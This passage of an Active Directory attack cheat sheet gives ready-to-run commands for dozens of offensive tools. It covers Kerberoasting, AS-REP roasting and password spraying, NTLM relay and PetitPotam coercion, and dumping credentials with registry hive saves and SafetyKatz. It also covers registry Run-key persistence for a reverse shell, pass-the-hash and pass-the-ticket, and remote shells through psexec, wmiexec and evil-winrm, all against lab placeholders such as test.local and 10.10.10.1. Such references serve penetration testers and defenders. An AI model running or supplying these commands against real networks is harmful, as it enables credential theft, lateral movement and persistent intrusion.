Rubeus.exe /users:usernames.txt /passwords:passwords.txt /domain:test.local /outfile:found_passwords.txt

```

#### Rubeus-Kerberoast
Rubeus' `kerberoast` module will attempt to fetch Service Principal Names that are associated with normal user accoun...
**Categories:** Kerberos, Exploitation, PrivEsc
```
Rubeus.exe kerberoast /outfile:hashes.txt

```

#### Rubeus-s4u
Rubeus' `s4u` module performs Kerberos constrained delegation attacks using the S4U2Self and S4U2Proxy. This techniqu...
**Categories:** Kerberos, Exploitation, Lateral Movement, Privilidge Escalation
```
Rubeus.exe s4u /user:john$ /aes256:2a3de7fe356ee524cc9f3d579f2e0aa7 /impersonateuser:Administrator /msdsspn:time/dc.test.local /altservice:ldap /ptt

```

#### targetedKerberoast
targetedKerberoast is a Python script that can, like many others (e.g. GetUserSPNs.py), print "kerberoast" hashes for...
**Categories:** Kerberos, NTLM, Exploitation
```
python3 targetedKerberoast.py -d test.local -u john -p password123 --dc-ip 10.10.10.1

```

### LDAP

#### BloodHound.py-Remote-Ingestion
BloodHound is a single page Javascript web application, built on top of Linkurious, compiled with Electron, with a Ne...
**Categories:** LDAP, Enumeration
```
bloodhound.py -d test.local -v --zip -c All -dc test.local -ns 10.10.10.1

```

#### BloodHound.py-Remote-Ingestion-Creds
BloodHound is a single page Javascript web application, built on top of Linkurious, compiled with Electron, with a Ne...
**Categories:** LDAP, Enumeration
```
bloodhound.py -u john -p password123 -d test.local -v --zip -c All -dc test.local -ns 10.10.10.1

```

#### Impacket-addcomputer-LDAPS
Impacket's addcomputer.py will add a computer account to the domain and set its password. The following command will...
**Categories:** LDAP, Exploitation, Persistence
```
python3 addcomputer.py -method LDAPS -dc-ip 10.10.10.1 -computer-pass TestPassword321 -computer-name testComputer test.local/john:password123

```

#### LDAPSearch-Creds
ldapsearch is a Linux based tool that opens a connection to an LDAP server, binds, and performs a search using specif...
**Categories:** LDAP, Enumeration
```
ldapsearch -h test.local -D 'ldap@test.local' -w password123 -b 'dc=test,dc=local'

```

#### LDAPSearch-NoCreds
ldapsearch is a Linux based tool that opens a connection to an LDAP server, binds, and performs a search using specif...
**Categories:** LDAP, Enumeration
```
ldapsearch -LLL -x -H ldap://test.local -b'' -s base '(objectclass=\*)'

```

#### NetExec-Enum-LDAP
"NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large netwo...
**Categories:** LDAP, Enumeration
```
nxc ldap 10.10.10.1 -u 'john' -p 'password123' --trusted-for-delegation  --password-not-required --admin-count --users --groups

```

#### NetExec-LDAP-ASREPRoasting
NetExec (formerly CrackMapExec) performs an AS-REP Roasting attack via the LDAP service.
This command attempts to enu...
**Categories:** LDAP, Credential Access, AS-REP Roasting
```
nxc ldap 10.10.10.1 -u users.txt -p '' --asreproast output.txt

```

#### NetExec-LDAP-Kerberoasting
NetExec (formerly CrackMapExec) performs a Kerberoasting attack via the LDAP service.
This command authenticates with...
**Categories:** LDAP, Credential Access, Kerberoasting
```
nxc ldap 10.10.10.1 -u 'john' -p 'password123' --kerberoasting output.txt

```

#### PyLDAPmonitor
ldapmonitor.py allows you to monitor creation, deletion and changes to LDAP objects live during your pentest.

Comman...
**Categories:** LDAP, Kerberos, NTLM, Enumeration
```
python3 ldapmonitor.py -u 'john' -d 'TEST.local' -p 'password123' --dc-ip 10.10.10.1

```

#### SharpHound-LDAP
SharpHound.exe is the official data collector for BloodHound, written in C# and uses Windows API functions and LDAP n...
**Categories:** LDAP, PrivEsc, Enumeration
```
SharpHound.exe --CollectionMethod All --LdapUsername john --LdapPassword password123 --ZipFileName output.zip

```

#### SharpLDAPmonitor
SharpLDAPmonitor.exe allows you to monitor creation, deletion and changes to LDAP objects live during your pentest....
**Categories:** LDAP, Kerberos, NTLM, Enumeration
```
SharpLDAPmonitor.exe /dcip:10.10.10.1 /user:TEST.local\john /pass:password123

```

### No_Creds

#### Enum4Linux-NoCreds
Enum4Linux is a tool for enumerating information from Windows and Samba systems, using a number of different techniqu...
**Categories:** No_Creds, Enumeration
```
enum4linux -a 10.10.10.1

```

### NTLM

#### Impacket-NTLMRelayX
Impacket's ntlmrelayx.py performs NTLM Relay Attacks, creating an SMB and HTTP server and relaying credentials to var...
**Categories:** NTLM, Exploitation
```
python3 ntlmrelayx.py -smb2support -t smb://10.10.10.1 -c 'whoami /all' -debug

```

#### Impacket-NTLMRelayX-Socks
Impacket's ntlmrelayx.py performs NTLM Relay Attacks, creating an SMB and HTTP server and relaying credentials to var...
**Categories:** NTLM, SMB, Exploitation
```
python3 ntlmrelayx.py -smb2support -t smb://10.10.10.1 -socks

```

#### Impacket-NTLMRelayX-WPAD
Impacket's ntlmrelayx.py performs NTLM Relay Attacks, creating an SMB and HTTP server and relaying credentials to var...
**Categories:** NTLM, LDAP, Exploitation
```
python3 ntlmrelayx.py -t ldaps://dc.test.local -wh test-wpad --delegate-access

```

#### Responder-Analyze
Responder is an LLMNR, NBT-NS, and MDNS poisoner. It will answer to specific NBT-NS (NetBIOS Name Service) queries ba...
**Categories:** NTLM, SMB, Exploitation
```
Responder -I eth0 -A

```

### PowerShell

#### PwshADmodule-DelegationAttack-Enum
Having imported the pwsh AD module referenced in the project, we can begin to use it to enumerate for potential point...
**Categories:** PowerShell, Enumeration
```
# 1. Unconstrained (turned on for all Domain controllers by default)
(Get-ADForest).Domains | % { Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Server $_ | select Name,DNSHostName; Get-ADUser -Filter {TrustedForDelegation -eq $true} -Server $_ | select Name,SamAccountName }


# 2. Constrained (with protocol transition check)
(Get-ADForest).Domains | % { Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation -Server $_ | select Name,TrustedToAuthForDelegation,msDS-AllowedToDelegateTo; Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation -Server $_ | select Name,TrustedToAuthForDelegation,msDS-AllowedToDelegateTo }

# 3. RBCD (which object is already configured)
(Get-ADForest).Domains | % { Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity -Server $_ | ? {$_."msDS-AllowedToActOnBehalfOfOtherIdentity"} | select Name,DNSHostName }

# 4. RBCD (which object can configure it - write access)
(Get-ADForest).Domains | % { Get-ADComputer -Filter * -Properties nTSecurityDescriptor -Server $_ | ? {$_.nTSecurityDescriptor.Access | ? {$_.ActiveDirectoryRights -match "GenericWrite|WriteProperty" -and $_.IdentityReference -notmatch "SYSTEM|Domain Admins"}} | select Name }

```

### RPC

#### Dementor
dementor.py interacts with the printer spooler on a host to trigger an authentication from the target IP to an attack...
**Categories:** RPC, NTLM, Exploitation
```
python3 dementor.py -u john -p password123 -d test.local 10.10.10.2 10.10.10.1

```

#### Impacket-LookUpSID
Impacket's lookupsid.py performs bruteforcing of Windows SID's to identify users/groups on the remote target.

Comman...
**Categories:** RPC, Enumeration
```
python3 lookupsid.py test.local/john:password123@10.10.10.1

```

#### Impacket-RPCDump
Impacket's rpcdump.py enumerates Remote Procedure Call (RPC) endpoints.

Command Reference:

	Target IP: 10.10.10.1...
**Categories:** RPC, Enumeration
```
python3 rpcdump.py test.local/john:password123@10.10.10.1

```

#### Impacket-SAMRDump
Impacket's samrdump.py communicates with the Security Account Manager Remote (SAMR) interface to list system user acc...
**Categories:** RPC, Enumeration
```
python3 samrdump.py test.local/john:password123@10.10.10.1

```

#### Impacket-Services
Impacket's services.py communicates with Windows services using the MSRPC interface. It can perform many different ac...
**Categories:** RPC, Enumeration
```
python3 services.py test.local/john:password123@10.10.10.1 list

```

#### PetitPotam
PetitPotam leverages the MS-EFSRPC API to connect to a Windows host, hijack the authentication session, and trigger a...
**Categories:** RPC, NTLM, Exploitation
```
python3 PetitPotam.py -d test.local -u john -p password123 10.10.10.2 10.10.10.1

```

#### RPCClient-Anonymous
rpcclient is a tool used for executing client side MS-RPC functions to manage Windows NT clients from Unix workstatio...
**Categories:** RPC, Enumeration
```
rpcclient -U '' -N 10.10.10.1

```

### Shell

#### ADCSEnumaration
Active Directory Certifcate Services or ADCS provide an alternative way to authenticate within a AD enviroment that c...
**Categories:** Shell, Enumeration
```
#Note that we are just enumarating here. We are not preforming exploitation. There is a linux equalivent called certipy that works much the same way
# Find CAs 
C:Tools\Certify.exe cas 

# Find templates
C:Tools\Certify.exe find 

# Find vulnerable templates
C:Tools\Certify.exe find /vulnerable 

```

#### CredDumpWithoutMimilkatz
The lsass Process while great, is no where neaar the only way to dump credintials from windows. One of which is acces...
**Categories:** Shell, PrivEsc, Exploitation
```
# The following command will dump the SAM, SYSTEM, and SECURITY hives to the current directory.
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive

#Assuming you have transfered the hives to your kali
samdump2 system sam 

#We can also get lsa secrets via mimikatz
lsadump::secrets /system:c:\temp\system.hive /security:c:\temp\security.hive

```

#### Regexe-Persistence
It is possible to gain persistence on a windows machine by adding reg keys that will execute an arbitrary payload dur...
**Categories:** Shell, Persistence
```
reg.exe add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Persistence /t REG_SZ /d "C:\Path\To\revshell.exe"

reg.exe add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Persistence /t REG_SZ /d "C:\Path\To\revshell.exe"

```

#### SafetyKatz
SafetyKatz.exe is part of the GhostPack suite of tools and is a combination of SharpDump and Mimikatz. The following...
**Categories:** Shell, PrivEsc, Enumeration
```
safetykatz.exe "privilege::debug" "sekurlsa::evasive-logonpasswords" "exit"

```

#### Seatbelt
Seatbelt.exe is part of the GhostPack suite of tools that will perform a lot of "safety checks" on the Windows host a...
**Categories:** Shell, PrivEsc, Persistence
```
Seatbelt.exe -group=all -full > output.txt

```

#### SharpDump
SharpDump.exe is part of the GhostPack suite of tools and is a C# port of PowerSploit's Out-Minidump.ps1. It can dump...
**Categories:** Shell, PrivEsc, Enumeration
```
SharpDump.exe

```

#### SharpHound
SharpHound.exe and SharpHound.ps1 are the official data collector for BloodHound, written in C# or Powershell and use...
**Categories:** Shell, PrivEsc, Enumeration
```
SharpHound.exe --CollectionMethods All --ZipFileName output.zip
#Using PowerShell module
powershell -ep bypass 
.\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain domain.tld -ZipFileName output.zip

```

#### SharpUp
SharpUp.exe is part of the GhostPack suite of tools and is a C# port of PowerUp that will perform numerous privilege...
**Categories:** Shell, PrivEsc
```
SharpUp.exe > output.txt

```

#### winPEAS
winpeas.exe is a script that will search for all possible paths to escalate privileges on Windows hosts. The below co...
**Categories:** Shell, PrivEsc
```
winpeas.exe cmd > output.txt

```

### SMB

#### enum4linux-ng
enum4linux-ng is a modern reimplementation of enum4linux written in Python3. It is used to enumerate information from...
**Categories:** SMB, Enumeration
```
enum4linux-ng 10.10.10.1

```

#### FindUncommonShares
The script FindUncommonShares.py is a Python equivalent of PowerView's Invoke-ShareFinder.ps1 allowing to quickly fin...
**Categories:** SMB, Enumeration
```
python3 FindUncommonShares.py -u 'john' -d 'TEST.local' -p 'password123' --dc-ip 10.10.10.1

```

#### Impacket-addcomputer-SMB
Impacket's addcomputer.py will add a computer account to the domain and set its password. The following command will...
**Categories:** SMB, Exploitation, Persistence
```
python3 addcomputer.py -method SAMR -dc-ip 10.10.10.1 -computer-pass TestPassword321 -computer-name testComputer test.local/john:password123

```

#### Impacket-atexec-Creds
Impacket's atexec.py uses the Task Scheduler service on the remote Windows host to execute the given command. It will...
**Categories:** SMB, Exploitation
```
python3 atexec.py test.local/john:password123@10.10.10.1 whoami

```

#### Impacket-atexec-Hash
Impacket's atexec.py uses the Task Scheduler service on the remote Windows host to execute the given command. It will...
**Categories:** SMB, Exploitation
```
python3 atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 test.local/john@10.10.10.1 whoami

```

#### Impacket-Get-GPPPassword
Python script to automatically extract and decrypt Group Policy Preferences (GPP) passwords using streams for carving...
**Categories:** SMB, Exploitation, Enumeration
```
python3 Get-GPPPassword.py 'TEST.local/john:password123@DC01.TEST.local' -dc-ip 10.10.10.1

```

#### Impacket-PsExec
Impacket's psexec.py offers psexec like functionality. This will give you an interactive shell on the Windows host....
**Categories:** SMB, Exploitation
```
python3 psexec.py test.local/john:password123@10.10.10.1

```

#### Impacket-PsExec-PassTheTicket
Impacket's psexec.py offers psexec like functionality. This will give you an interactive shell on the Windows host. p...
**Categories:** SMB, Exploitation
```
export KRB5CCNAME=/full/path/to/john.ccache; python3 psexec.py test.local/john@10.10.10.1 -k -no-pass

```

#### Impacket-Reg
Impacket's reg.py is a remote registry manipulation tool, providing similar functionality to reg.exe in Windows.

Com...
**Categories:** SMB, Exploitation, Persistence
```
python3 reg.py test.local/john:password123@10.10.10.1 query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s

```

#### Impacket-SMBClient
Impacket's smbclient.py is a generic smbclient, allowing you to list shares and files, rename, upload and download fi...
**Categories:** SMB, Enumeration
```
python3 smbclient.py test.local/john:password123@10.10.10.1

```

#### Impacket-SMBExec
Impacket's smbexec.py. This will give you an interactive shell on the Windows host.

Command Reference:

	Target IP:...
**Categories:** SMB, Exploitation
```
python3 smbexec.py test.local/john:password123@10.10.10.1

```

#### NetExec-Creds-coerce_plus
"NetExec (a.k.a nxc) is a network pentesting suite that has many modules that can be listed via nxc <protocol> -L. Th...
**Categories:** SMB, Enumeration, Privilidge Escalation, Exploitation, Laterl movement
```
nxc smb 10.10.10.1 -u john -p password123 -M coerce_plus 

```

#### NetExec-Enum-SMB
"NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large netwo...
**Categories:** SMB, Enumeration
```
nxc smb 10.10.10.1 -u 'john' -p 'password123' --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol

```

#### NetExec-Enum-SMB-Anonymous
"NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large netwo...
**Categories:** SMB, Enumeration
```
nxc smb 10.10.10.1 -u 'a' -p ''

```

#### NetExec-Enum-SMB-Null
"NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large netwo...
**Categories:** SMB, Enumeration
```
nxc smb 10.10.10.1 -u '' -p ''

```

#### NetExec-Enum-SMB-Relay-List
"NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large netwo...
**Categories:** SMB, Enumeration
```
nxc smb smb_host.txt --gen-relay-list output.txt

```

#### NetExec-Exec-SMB
"NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large netwo...
**Categories:** SMB, Exploitation
```
nxc smb 10.10.10.1 -u 'john' -p 'password123' -X '$Host'

```

#### NetExec-SMB-Password-Spray
"NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large netwo...
**Categories:** SMB, Exploitation
```
nxc smb 10.10.10.1 -u users.txt -p password123

```

#### NetExec-SMB-Timeroasting
NetExec (formerly CrackMapExec) performs a Timeroasting attack via the SMB service.
This command targets the remote W...
**Categories:** SMB, Credential Access, Timeroasting
```
nxc smb 10.10.10.1 -M timeroast

```

#### SMBClient-Enum-Share
Smbclient is a tool used to communicate with SMB servers. The following command will connect to an SMB share `C$` usi...
**Categories:** SMB, Enumeration
```
smbclient \\\\test.local\\C$ -I 10.10.10.1 -U john password123

```

#### SMBClient-Enum-Share-Anonymous
Smbclient is a tool used to communicate with SMB servers. The following command will connect to an SMB share `public`...
**Categories:** SMB, Enumeration
```
smbclient \\\\test.local\\public -I 10.10.10.1 -N

```

#### SMBClient-List-Share-PTH
Smbclient is a tool used to communicate with SMB servers. The following command will list out all available shares on...
**Categories:** SMB, Enumeration
```
smbclient -L \\10.10.10.1 -U test.local/john --pw-nt-hash XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

```

#### SMBClient-List-Shares
Smbclient is a tool used to communicate with SMB servers. The following command will list out all available shares on...
**Categories:** SMB, Enumeration
```
smbclient -L \\test.local -I 10.10.10.1 -U john password123

```

#### SMBClient-List-Shares-Anonymous
Smbclient is a tool used to communicate with SMB servers. The following command will list out all available shares on...
**Categories:** SMB, Enumeration
```
smbclient -L \\test.local -I 10.10.10.1 -N

```

#### SMBMap-Enum-File
SMBMap is a tool used to enumerate SMB share drives, including listing share drive permissions, share contents, uploa...
**Categories:** SMB, Enumeration
```
python3 smbmap.py --host-file smb-hosts.txt -u john -p 'password123' -d test.local -F password

```

#### SMBMap-Enum-Share
SMBMap is a tool used to enumerate SMB share drives, including listing share drive permissions, share contents, uploa...
**Categories:** SMB, Enumeration
```
python3 smbmap.py --host-file smb-hosts.txt -u john -p 'password123' -d test.local -L

```

#### SMBMap-Enum-Share-Anonymous
SMBMap is a tool used to enumerate SMB share drives, including listing share drive permissions, share contents, uploa...
**Categories:** SMB, Enumeration
```
python3 smbmap.py --host-file smb-hosts.txt -d test.local -L

```

#### Snaffler
Snaffler is a tool used to enumerate sensitive data (passwords, PII, etc.) from file shares in Active Directory. It s...
**Categories:** SMB, Enumeration
```
Snaffler.exe -s -o snaffler_output.log -d test.local -c 10.10.10.1

```

### Username

#### bloodyAD-Wite-Properties
BloodyAD can be used to set, write and delete properties of objects in AD. Given a user:pass, you can use bloodyAD to...
**Categories:** Username, Password, Enumeration
```
bloodyAD --host 10.10.10.1 -d test.local -u john -p password123 -d test.local get writable --detail

```

#### Enum4Linux-Creds
Enum4Linux is a tool for enumerating information from Windows and Samba systems, using a number of different techniqu...
**Categories:** Username, Password, Enumeration
```
enum4linux -u john -p password123 -a 10.10.10.1

```

#### Windapsearch
windapsearch enumerates users, groups, and computers from a Windows domain through LDAP queries. The following comman...
**Categories:** Username, Password, Enumeration
```
python3 windapsearch --dc-ip 10.10.10.1 -u test.local\\john -p password123 -U -G --da -m "Remote Desktop Users" -C -r

```

### WMI

#### Evil-WinRM
Evil-WinRM uses the Windows Management Instrumentation (WMI) to give you an interactive shell on the Windows host.

C...
**Categories:** WMI, Exploitation
```
evil-winrm -i 10.10.10.1 -u john -p password123

```

#### Evil-Winrm-PKINIT
Evil-WinRM uses the Windows Management Instrumentation (WMI) to give you an interactive shell on the Windows host. Wi...
**Categories:** WMI, Exploitation
```
evil-winrm -i 10.10.10.1 -c pub.pem -k priv.pem -S -r EVILCORP

```

#### Evil-WinRM-PTH
Evil-WinRM uses the Windows Management Instrumentation (WMI) to give you an interactive shell on the Windows host. Ev...
**Categories:** WMI, Exploitation
```
evil-winrm -i 10.10.10.1 -u john -H c23b2e293fa0d312de6f59fd6d58eae3

```

#### Impacket-WMIExec
Impacket's wmiexec.py uses the Windows Management Instrumentation (WMI) to give you an interactive shell on the Windo...
**Categories:** WMI, Exploitation
```
python3 wmiexec.py test.local/john:password123@10.10.10.1

```

#### SharpWMI
SharpWMI.exe is part of the GhostPack suite of tools that provides WMI functionality, such as local/remote WMI querie...
**Categories:** WMI, Persistence
```
SharpWMI.exe action=query query="select * from win32_process"

```
